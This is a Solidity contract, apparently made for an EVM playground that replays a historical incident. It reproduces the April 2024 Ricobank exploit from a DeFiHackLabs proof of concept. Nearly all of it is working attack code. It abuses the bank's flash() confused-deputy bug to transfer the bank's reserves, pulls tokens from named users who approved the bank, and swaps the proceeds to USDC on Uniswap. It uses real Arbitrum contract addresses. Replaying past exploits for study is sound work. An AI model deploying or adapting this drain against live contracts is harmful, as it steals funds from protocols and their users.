// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.15;

// Synthetic standalone exploit for the EVM Playground (2024-04-Rico).
// The DeFiHackLabs PoC runs the whole attack INLINE in the Foundry test contract
// (attacker = address(this), no separate exploit contract is deployed). This
// contract is a faithful, self-contained copy of that inline attack (testExploit
// -> transferTokens/transferFromOwner/swapTokens) so the playground can deploy it
// and record run(). Logic and constants are copied verbatim from
// test/Rico_exp.sol.
//
// Root cause: Ricobank's Vat.flash(address code, bytes data) mints 2**128 RICO to
// `code`, then does `code.call(data)` with msg.sender == BankDiamond, then burns
// the RICO back. `code` is attacker-controlled and unconstrained, so the attacker
// sets code = a token the bank holds and data = transfer(attacker, bankBalance) --
// the bank unwittingly authorizes a transfer of its own reserves.

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

interface IBankDiamond {
    function flash(address, bytes calldata) external returns (bytes memory result);
}

interface Uni_Router_V3 {
    struct ExactInputSingleParams {
        address tokenIn;
        address tokenOut;
        uint24 fee;
        address recipient;
        uint256 deadline;
        uint256 amountIn;
        uint256 amountOutMinimum;
        uint160 sqrtPriceLimitX96;
    }

    function exactInputSingle(ExactInputSingleParams memory params) external payable returns (uint256 amountOut);
}

contract RicoDrain {
    address constant BankDiamond = 0x598C6c1cd9459F882530FC9D7dA438CB74C6CB3b;
    address constant UniV3Router = 0xE592427A0AEce92De3Edee1F18E0157C05861564;

    address constant USDC_TOKEN = 0xaf88d065e77c8cC2239327C5EDb3A432268e5831;
    address constant ARB_TOKEN = 0x912CE59144191C1204E64559FE8253a0e49E6548;
    address constant LINK_TOKEN = 0xf97f4df75117a78c1A5a0DBb814Af92458539FB4;
    address constant WSTETH_TOKEN = 0x5979D7b546E38E414F7E9822514be443A4800529;
    address constant WETH_TOKEN = 0x82aF49447D8a07e3bd95BD0d56f35241523fBab1;
    address constant ARB_USDC_TOEKN = 0xFF970A61A04b1cA14834A43f5dE4533eBDDB5CC8;

    // entrypoint: mirrors testExploit() exactly, called by the attacker EOA.
    function run() external {
        // Transfer tokens from BankDiamond to the attacker via flash()'s
        // arbitrary call-target confused-deputy bug.
        transferTokens(USDC_TOKEN);
        transferTokens(ARB_TOKEN);
        transferTokens(LINK_TOKEN);
        transferTokens(WSTETH_TOKEN);
        transferTokens(WETH_TOKEN);
        transferTokens(ARB_USDC_TOEKN);

        // TransferFrom tokens from owners who approved the bank (no-ops at the
        // historical block: the bank's spare balance for these tokens was 0).
        transferFromOwner(0x512E07A093aAA20Ba288392EaDF03838C7a4e522, USDC_TOKEN);
        transferFromOwner(0x83eCCb05386B2d10D05e1BaEa8aC89b5B7EA8290, USDC_TOKEN);
        transferFromOwner(0x7b782A4D552a8ceB3924005a786a1a358BA63f71, WSTETH_TOKEN);

        // Swap everything (except USDC) to USDC using UniV3Router.
        swapTokens(ARB_TOKEN);
        swapTokens(LINK_TOKEN);
        swapTokens(WSTETH_TOKEN);
        swapTokens(WETH_TOKEN);
        swapTokens(ARB_USDC_TOEKN);
    }

    function _getTransferData(address token) internal view returns (bytes memory data) {
        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
        data = abi.encodeWithSelector(IERC20.transfer.selector, address(this), tokenBalance);
    }

    function _getTransferFromData(address token, address user) internal view returns (bytes memory data) {
        uint256 tokenBalance = IERC20(token).balanceOf(BankDiamond);
        uint256 tokenAllowance = IERC20(token).allowance(user, BankDiamond);
        if (tokenBalance >= tokenAllowance) {
            data = abi.encodeWithSelector(IERC20.transferFrom.selector, user, address(this), tokenBalance);
        }
    }

    function transferTokens(address token) internal {
        // The confused-deputy call: `code` = token, `data` = transfer(attacker, bankBal).
        IBankDiamond(BankDiamond).flash(token, _getTransferData(token));
    }

    function transferFromOwner(address owner, address token) internal {
        bytes memory callData = _getTransferFromData(token, owner);
        if (callData.length > 0) {
            IBankDiamond(BankDiamond).flash(token, callData);
        }
    }

    function swapTokens(address token) internal {
        uint256 tokenBalance = IERC20(token).balanceOf(address(this));
        IERC20(token).approve(UniV3Router, tokenBalance);

        Uni_Router_V3.ExactInputSingleParams memory params;
        params.tokenIn = token;
        params.tokenOut = USDC_TOKEN;
        params.fee = 3000;
        params.recipient = address(this);
        params.deadline = block.timestamp;
        params.amountIn = tokenBalance;
        params.amountOutMinimum = 0;
        params.sqrtPriceLimitX96 = 0;
        Uni_Router_V3(UniV3Router).exactInputSingle(params);
    }
}
